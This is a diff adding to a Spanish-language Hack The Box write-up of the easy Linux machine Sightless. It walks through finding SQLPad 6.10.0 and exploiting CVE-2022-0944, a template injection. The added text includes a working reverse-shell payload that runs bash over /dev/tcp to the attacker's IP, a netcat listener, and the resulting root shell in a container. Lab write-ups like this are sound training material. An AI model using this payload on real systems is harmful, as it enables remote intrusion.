@@ -1,4 +1,4 @@
----
+![imagen](https://github.com/user-attachments/assets/3199941f-a364-493b-855c-474481ba6cf5)---
 description: >-
   Writeup de la máquina de dificultad fácil Sightless de la página https://hackthebox.eu
 title: Hack The Box - Sightless | (Difficulty Easy) - Linux
@@ -12,6 +12,8 @@ image: https://github.com/user-attachments/assets/3369b1c5-339a-4c19-abb3-aa5b82
 ## Useful Skills
 
 * Web enumeration
+* Abusing Template Injection to RCE (SQLPad 6.10.0 - CVE-2022-0944) [Gain access]
+* 
 
 ## Enumeration
 
@@ -92,5 +94,89 @@ Accediendo a la página en http://sightless.htb/ se puede observar una web de un
 
 ![imagen](https://github.com/user-attachments/assets/0bbc6ad5-d426-4d78-8882-91bf492d9e93)
 
+En la sección services de la página web puedo observar diferentes servicios, son tres servicios:
+
+* SQLPad: Es una aplicación web que permite a los usuarios conectarse a varios servidores SQL a través de un navegador.
+* Froxlor: Es un Panel de control de servidores multilenguaje, con una interfaz gráfica web que permite administrar, entre otros, los servicios de correo electrónico, dominios y FTP.
+* Database & Server Management: Gestión de bases de datos y sistemas.
 
 ![imagen](https://github.com/user-attachments/assets/e8b9c0a5-e01c-449e-a4c9-a01e71dbba80)
+
+> Puede que se esté utilizando Froxlor para administrir el servidor FTP que se ha detectado en el escaneo de puertos
+{: .prompt-info }
+
+Intento acceder al primer servicio, obtengo un error del navegador el cual me indica que no se puede conectar a sqlpad.sightless.htb
+
+![imagen](https://github.com/user-attachments/assets/9062ad9d-f74c-461f-b9e4-5fc531820fde)
+
+> Hay que añadir el dominio sqlpad.sightless.htb en el archivo de configuración /etc/hosts para que se puede resolver el nombre de dominio a la dirección IP 10.10.11.32
+{: .prompt-tip }
+
+Intento acceder nuevamente a http://sqlpad.sightless.htb, la primera visión que obtengo es la aplicación gráfica SQLPad la cual permite conectarse a diferentes servidores SQL
+
+![imagen](https://github.com/user-attachments/assets/7985ef2f-d2d6-4cef-8ead-23ca92e06703)
+
+En la parte superior derecha observo tres puntos al hacer clic sobre los mismos puedo ver una opción About, al acceder la misma puedo descubrir la versión de SQLPad, la cual es 6.10.0
+
+![imagen](https://github.com/user-attachments/assets/d6d8f19e-024a-425b-b28a-2cc26f6997eb)
+
+![imagen](https://github.com/user-attachments/assets/cd4608e6-21df-494a-9870-d5fcc254d1b9)
+
+> Sabiendo que es SQLPad y que la versión es 6.10.0 puedo buscar información sobre posibles vulnerabilidades existentes
+{: .prompt-info }
+
+## Vulnerability analysis
+
+### CVE-2022-0944 (SQLPad Remote Command Execution)
+
+Una pequeña búsqueda en internet me permite dar con la vulnerabilidad CVE-2022-0944, se trata de una vulnerabilidad que permite la ejecución remota de código a través una template injection en el endpoint /api/test-connectionendpoint
+
+* [NVD Explanation CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)
+
+## Exploitation
+
+### Abusing SQLPad RCE Vulnerability (CVE-2022-0944)
+
+En huntr encuentro un post sobre la vulnerabilidad CVE-2022-0944 el cual me sirven de guía para realizar la explotación de forma manual y entender como funciona todo.
+
+* [Template injection in connection test endpoint leads to RCE in sqlpad/sqlpad](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)
+
+![imagen](https://github.com/user-attachments/assets/d13e1b2f-7fd7-44a0-96cb-0af165a8ed49)
+
+El primer paso es acceder a connections y añadir una nueva conexión
+
+![imagen](https://github.com/user-attachments/assets/50020b32-c3e5-4479-b554-292d502a6aa3)
+
+![imagen](https://github.com/user-attachments/assets/7ccc4636-ab54-46a5-a53c-b8c20053c1ca)
+
+Selecciono MySQL como Driver
+
+![imagen](https://github.com/user-attachments/assets/9d039b44-3b7d-4a06-9139-f9e7a8f29eb5)
+
+Inicio un listener con netcat por el puerto 4444 para obtener la reverse shell al ejecutar la inyección
+
+```bash
+nc -lvnp 4444
+listening on [any] 4444 .
+```
+
+En el campo Database introduzco el payload que contiene la inyección acomodada para enviar una reverse shell hacia mi máquina de atacante
+
+> Payload: {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.160/4444 0>&1"') }}
+{: .prompt-info }
+
+![imagen](https://github.com/user-attachments/assets/1f6803ec-b88d-4908-a167-8e2e991b41a0)
+
+Por ultimo hago clic sobre Test y obtengo la reverse shell a lo que parece ser un contenedor, ya que la IP victima es la 10.10.11.32 y me encuentro en la 172.17.0.2
+
+![imagen](https://github.com/user-attachments/assets/d3a1df29-b740-4234-91ac-243e50530d1d)
+
+```bash
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.160] from (UNKNOWN) [10.10.11.32] 47918
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@c184118df0a6:/var/lib/sqlpad# hostname -I
+172.17.0.2
+```
